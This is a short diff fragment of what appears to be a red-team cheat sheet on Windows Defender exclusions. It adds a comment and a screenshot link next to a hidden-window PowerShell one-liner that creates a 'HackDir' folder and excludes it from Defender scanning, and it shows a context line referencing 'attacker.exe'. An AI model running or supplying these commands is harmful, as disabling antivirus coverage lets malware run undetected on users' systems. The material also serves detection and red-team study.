@@ -23,8 +23,11 @@ Remove-MpPreference -ExclusionPath "$env:USERPROFILE\Documents\attacker.exe" # e
 
 ### Use from Run/cmd
 ```cmd
+:: create $env:USERPROFILE\HackDir directory and add it to exclusions
 powershell -WindowStyle Hidden -command "New-Item -Path $env:USERPROFILE\HackDir -ItemType Directory; Add-MpPreference -ExclusionPath "$env:USERPROFILE\HackDir""
 ```
+![screen](add_run_cmd.png)
+
 
 ### Add path/executable file via Regedit
 ```ps1
